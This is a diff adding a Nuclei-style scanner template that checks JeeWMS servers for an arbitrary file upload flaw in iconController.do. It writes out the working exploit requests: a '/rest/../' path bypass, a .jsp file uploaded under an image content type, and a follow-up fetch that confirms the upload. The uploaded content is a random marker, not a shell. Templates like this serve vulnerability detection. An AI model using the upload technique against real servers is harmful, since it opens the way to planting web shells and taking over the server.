@@ -1,0 +1,52 @@
+id: jeewms-iconcontroller-anyfile-upload
+
+info:
+  name: JeeWMS iconController.do Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload,jeewms
+
+variables:
+  t1: "{{rand_text_alphanumeric(5)}}"
+  t2: "{{base64(t1)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: initial-upload
+    method: POST
+    path:
+      - "{{BaseURL}}/rest/../iconController.do?saveOrUpdateIcon"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryHRhkXyQjTSAk8j8c"
+    body: |-
+      ------WebKitFormBoundaryHRhkXyQjTSAk8j8c
+      Content-Disposition: form-data; name="name"; filename="{{t1}}.jsp"
+      Content-Type: image/png
+
+      {{t2}}
+      ------WebKitFormBoundaryHRhkXyQjTSAk8j8c--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"success\":true"
+          - "Icon add success"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/plug-in/accordion/images/{{t1}}.jsp"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
